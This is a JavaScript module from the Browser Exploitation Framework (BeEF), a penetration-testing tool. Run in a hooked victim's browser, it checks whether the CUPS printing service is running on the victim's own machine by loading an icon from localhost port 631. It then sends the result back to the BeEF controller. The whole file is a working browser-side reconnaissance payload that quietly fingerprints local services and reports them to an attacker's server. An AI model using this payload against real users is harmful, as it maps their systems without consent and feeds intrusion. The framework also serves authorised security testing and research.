//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var result = "Not Installed";
	var dom = document.createElement('b');
	var img = new Image;
	img.src = "http://127.0.0.1:631/images/cups-icon.png";
	img.onload = function() {
		if (this.width == 128 && this.height == 128) result="Installed";
		beef.net.send('<%= @command_url %>', <%= @command_id %>,'cups='+result);
		dom.removeChild(this);
	}
	img.onerror = function() {
		beef.net.send('<%= @command_url %>', <%= @command_id %>,'cups='+result);
		dom.removeChild(this);
	}
	dom.appendChild(img);

});

